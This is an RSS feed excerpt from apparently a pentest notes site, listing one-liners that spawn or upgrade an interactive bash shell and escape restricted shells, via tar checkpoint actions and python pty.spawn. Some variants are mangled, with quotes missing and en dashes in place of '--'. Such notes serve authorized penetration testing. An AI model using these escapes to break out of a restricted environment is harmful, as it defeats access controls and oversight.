channel.title: Sh on pentest notes
channel.description: Recent content in Sh on pentest notes

item.title: Shell
item.description: export PATH=/bin:/usr/bin:/usr/sbin:/sbin:$PATH export SHELL=/bin/bash tar cf /dev/null testfile --checkpoint=1 --checkpoint-action=exec=/bin/bash python -c 'import pty; pty.spawn("/bin/bash")' python3 -c 'import pty; pty.spawn("/bin/bash")' python -c import pty; pty.spawn("/bin/bash") python3 -c import pty; pty.spawn('/bin/bash') echo os.system('/bin/bash') /bin/sh -i echo "import pty; pty.spawn('/bin/bash')" /tmp/asdf.py python /tmp/asdf.py

item.title: Shell escape
item.description: export PATH=/bin:/usr/bin:/usr/sbin:/sbin:$PATH export SHELL=/bin/bash tar cf /dev/null ~/b –checkpoint=1 –checkpoint-action=exec=/bin/bash
